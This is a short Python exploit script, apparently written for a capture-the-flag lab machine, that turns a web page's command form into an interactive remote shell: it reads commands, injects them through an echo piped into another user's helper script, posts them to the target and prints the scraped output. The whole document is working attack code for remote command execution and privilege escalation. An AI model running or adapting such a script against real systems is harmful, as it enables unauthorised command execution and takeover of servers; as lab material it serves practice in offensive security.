#!/usr/bin/env python3

import requests
from urllib.parse import urlencode

url = "http://10.10.65.56/secret/"

#cmd = 'ls'

while(1):
	cmd = input("cmd: ")

	formatted_cmd = f'echo "whatever\n{cmd}" | /home/apaar/.helpline.sh'

	r = requests.post(url, data={
			"command": formatted_cmd
		})

	if '<h2 style="color:blue;">' in r.text:
		response = r.text.split('<h2 style="color:blue;">')[1]
		response = response.split('</h2>')[0]
		response = response.replace('Welcome to helpdesk. Feel free to talk to anyone at any time!\n\n','').replace('Thank you for your precious time!\n','')
		print(response)
